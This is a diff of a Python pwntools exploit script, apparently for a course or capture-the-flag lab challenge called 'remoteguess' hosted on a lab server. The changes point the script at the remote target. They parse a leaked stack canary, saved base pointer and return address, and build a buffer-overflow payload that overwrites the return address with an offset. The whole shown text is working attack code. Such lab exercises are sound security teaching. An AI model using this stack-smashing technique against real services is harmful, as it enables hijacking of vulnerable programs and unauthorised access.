@@ -25,9 +25,9 @@ if os.path.exists(exe):
     with open(exe, 'rb') as f:
         payload = f.read()
 
-r = process("./remoteguess", shell=True)
+# r = process("./remoteguess", shell=True)
 # r = remote("localhost", 10816)
-# r = remote("up23.zoolab.org", 10816)
+r = remote("up23.zoolab.org", 10816)
 
 if type(r) != pwnlib.tubes.process.process:
     pw.solve_pow(r)
@@ -41,8 +41,6 @@ if payload != None:
 else:
     r.sendlineafter(b'send to me? ', b'0')
 
-# r.interactive()
-print("start")
 buf = r.recvuntil(b'val: ')
 canary = r.recvuntil(b'\t', drop=True)
 print(f'canary:{canary}')
@@ -55,21 +53,16 @@ print(f'ra    :{ra}')
 question = r.recvuntil(b'answer?')
 print(question)
 
-canary = canary.decode()
-rbp = rbp.decode()
-ra = ra.decode()
+canary = int(canary.decode(),16)
+rbp = int(rbp.decode(),16)
+ra = int(ra.decode(),16)
 
-canary = int(canary, 16)
-rbp = int(rbp, 16)
-ra = int(ra, 16)
-
-myguess = 0x12345678
+myguess = 0x00000000
 
 ans = b'0' * 24
 ans += p64(canary)
 ans += p64(rbp)
 ans += p64(ra+0xab)
-ans += p64(myguess)
 ans += p64(myguess)
 ans += p64(myguess)
 ans += p64(myguess)
